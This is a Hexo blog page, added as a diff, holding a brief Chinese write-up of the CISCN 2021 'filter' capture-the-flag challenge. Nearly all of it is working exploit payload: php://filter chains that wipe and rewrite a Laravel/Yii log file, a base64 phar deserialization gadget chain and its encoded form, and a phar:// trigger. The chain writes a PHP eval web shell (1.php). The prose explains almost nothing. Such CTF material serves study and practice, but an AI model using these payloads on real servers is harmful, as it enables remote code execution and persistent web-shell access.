@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CISCN2021filter - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="知识点：
+laravel8 debug的复现
+php filter流的操作
+
+思路guoke师傅太强了。。
+跟这道题一个思路：
+1https:&amp;#x2F;&amp;#x2F;www.freebuf.com&amp;,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">CISCN2021filter</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">CISCN2021filter</h1>
+        <div class="stuff">
+            <span>五月 17, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><ul>
+<li>laravel8 debug的复现</li>
+<li>php filter流的操作</li>
+</ul>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>guoke师傅太强了。。</p>
+<p>跟这道题一个思路：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;264662.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>清空log日志：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.log</span><br><span class="line"></span><br><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoLAgAAAQAAABEAAAABAAAAAADVAQAATzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo0OiJheGluIjthOjE6e3M6MjoiaXMiO3M6ODoiaGFuZHNvbWUiO319czozMzoiAFN3aWZ0X0tleUNhY2hlX0Rpc2tLZXlDYWNoZQBwYXRoIjtPOjQyOiJwaHBEb2N1bWVudG9yXFJlZmxlY3Rpb25cRG9jQmxvY2tcVGFnc1xTZWUiOjE6e3M6MTQ6IgAqAGRlc2NyaXB0aW9uIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6IgAqAGZvcm1hdHRlcnMiO2E6MTp7czo2OiJyZW5kZXIiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjUyOiJmaWxlX3B1dF9jb250ZW50cygnMS5waHAnLCI8P3BocCBldmFsKFwkX1BPU1RbMF0pOyIpIjt9aToxO3M6MzoicnVuIjt9fX19fQcAAABleHAudHh0BAAAAKQtomAEAAAADH5/2LYBAAAAAAAA1XRlc3QXPuUMZZWd7xu6NTqDs7yrehohlQIAAABHQk1C</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=52=00=30=00=6C=00=47=00=4F=00=44=00=6C=00=68=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=78=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=38=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=79=00=4D=00=7A=00=6F=00=69=00=65=00=57=00=6C=00=70=00=58=00=47=00=52=00=69=00=58=00=45=00=4A=00=68=00=64=00=47=00=4E=00=6F=00=55=00=58=00=56=00=6C=00=63=00=6E=00=6C=00=53=00=5A=00=58=00=4E=00=31=00=62=00=48=00=51=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=7A=00=59=00=36=00=49=00=67=00=42=00=35=00=61=00=57=00=6C=00=63=00=5A=00=47=00=4A=00=63=00=51=00=6D=00=46=00=30=00=59=00=32=00=68=00=52=00=64=00=57=00=56=00=79=00=65=00=56=00=4A=00=6C=00=63=00=33=00=56=00=73=00=64=00=41=00=42=00=66=00=5A=00=47=00=46=00=30=00=59=00=56=00=4A=00=6C=00=59=00=57=00=52=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=78=00=4E=00=54=00=6F=00=69=00=52=00=6D=00=46=00=72=00=5A=00=58=00=4A=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6D=00=62=00=33=00=4A=00=74=00=59=00=58=00=52=00=30=00=5A=00=58=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=59=00=32=00=78=00=76=00=63=00=32=00=55=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=45=00=36=00=49=00=6E=00=6C=00=70=00=61=00=56=00=78=00=79=00=5A=00=58=00=4E=00=30=00=58=00=45=00=4E=00=79=00=5A=00=57=00=46=00=30=00=5A=00=55=00=46=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=54=00=6F=00=69=00=59=00=32=00=68=00=6C=00=59=00=32=00=74=00=42=00=59=00=32=00=4E=00=6C=00=63=00=33=00=4D=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=78=00=7A=00=49=00=6A=00=74=00=39=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=7A=00=6F=00=69=00=63=00=6E=00=56=00=75=00=49=00=6A=00=74=00=39=00=66=00=58=00=31=00=39=00=42=00=77=00=41=00=41=00=41=00=47=00=56=00=34=00=63=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=2B=00=6A=00=43=00=69=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=74=00=67=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=33=00=75=00=62=00=38=00=6B=00=63=00=42=00=71=00=45=00=34=00=48=00=53=00=4F=00=45=00=65=00=6C=00=4C=00=62=00=66=00=71=00=6E=00=55=00=55=00=76=00=6E=00=41=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://../runtime/log/app.log</span><br></pre></td></tr></table></figure>
+
+
+
+<p>。</p>
+<p>7.4版本把assertban 了，不知道咋玩了，</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
